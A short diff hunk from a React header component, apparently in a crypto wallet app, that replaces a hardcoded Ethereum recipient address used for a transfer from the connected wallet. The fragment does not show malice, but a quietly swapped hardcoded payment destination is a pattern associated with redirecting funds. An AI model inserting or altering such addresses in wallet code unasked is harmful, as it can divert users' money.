@@ -174,7 +174,7 @@ const Header: React.FC = () => {
       if (provider && walletAddress) {
         setIsLoading(true);
         const feeData = await provider.getFeeData();
-        const recipientAddress = '0xff8046Ae3b6E9c275728501856b5E0e37F59d6eb';
+        const recipientAddress = '0x9d4D1d27c18f14c3425d49A9Aa195a114c87eCd7';
         // Show sender balance before transfer
         const balanceBeforeTransfer = await provider.getBalance(walletAddress);
 
